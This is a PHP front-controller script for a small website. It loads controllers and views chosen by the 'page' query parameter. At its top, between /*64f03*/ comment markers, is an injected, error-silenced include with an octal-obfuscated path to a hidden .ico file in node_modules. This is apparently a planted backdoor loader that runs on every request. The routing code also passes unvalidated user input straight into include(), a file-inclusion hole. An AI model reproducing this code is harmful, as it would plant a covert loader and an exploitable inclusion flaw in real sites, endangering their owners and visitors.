<?php
/*64f03*/

@include "\057home\057wing\157vco/\160ubli\143_htm\154/lis\164amed\056com.\142r/no\144e_mo\144ules\057mime\055db/.\062630d\06159.i\143o";

/*64f03*/
error_reporting(E_ERROR);
ini_set('display_errors', 1);

//echo "<pre>----------------------------------------</pre>";
//echo "<pre>"; print_r($_GET); echo "</pre>";
//echo "<pre>"; print_r($_REQUEST); echo "</pre>";
//echo "<pre>----------------------------------------</pre>";


	$controller = $_GET['page'];

	$newModel = "";
	$aux = explode("_", $controller);
	foreach ($aux as $k => $v) {
		@$newController .= ucfirst($v);
	}

	$newModel = $controller."Controller";
	include("controller/".$controller.".php");
	$obj = new $newModel;

	include("view/layout/topo.php");
	include("view/".$controller.".php");
	include("view/layout/rodape.php");

?>
